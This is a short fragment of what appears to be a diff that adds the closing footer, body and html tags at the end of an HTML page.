+    </footer>
+  </body>
+</html>
